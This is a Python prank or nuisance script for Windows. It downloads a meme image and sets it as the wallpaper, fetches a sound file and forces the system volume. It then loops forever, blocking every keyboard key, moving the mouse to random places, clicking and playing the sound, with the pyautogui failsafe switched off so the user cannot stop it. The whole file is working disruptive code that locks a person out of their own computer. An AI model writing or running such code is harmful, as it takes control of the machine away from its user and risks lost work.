import os
import requests as req
import ctypes
import keyboard as k
import playsound
import mouse
import random
import pyautogui
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import time

pyautogui.FAILSAFE = False


all_keys = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
    'esc', 'tab', 'caps lock', 'shift', 'ctrl', 'alt', 'space', 'enter', 'backspace', 'delete', 'insert',
    'home', 'end', 'page up', 'page down', 'pause', 'print screen',
    'up', 'down', 'left', 'right',
    'num lock',
    'insert', 'scroll lock', 'print screen', 'windows', 'menu', 'application'
]

screen_width = 1920
screen_height = 1080

link = 'https://www.myinstants.com/media/sounds/rap-gemi2.mp3'
musres = req.get(link)

url = "https://i.imgflip.com/2xx9de.png"
res = req.get(url)



if musres.status_code == 200:
    with open('rap-gemi2.mp3', 'wb') as file:
        file.write(musres.content)
else:
    print('Failed to get music.')
muspath = os.path.abspath(r'rap-gemi2.mp3')



if res.status_code == 200:
    with open('2xx9de.png', 'wb') as file:
        file.write(res.content)
else:
    print('Failed to get picture.')
path = os.path.abspath('2xx9de.png')


ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)



def teleport_mouse():
    x = random.randint(0, screen_width)
    y = random.randint(0, screen_height)
    mouse.move(x, y)




devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.SetMasterVolumeLevel(-20.0, None)


 
while True:
    for key in all_keys:
        k.block_key(key)
    volume.SetMasterVolumeLevel(-20.0, None)
    teleport_mouse()
    time.sleep(0.1)
    pyautogui.click()

    
    playsound.playsound(muspath)
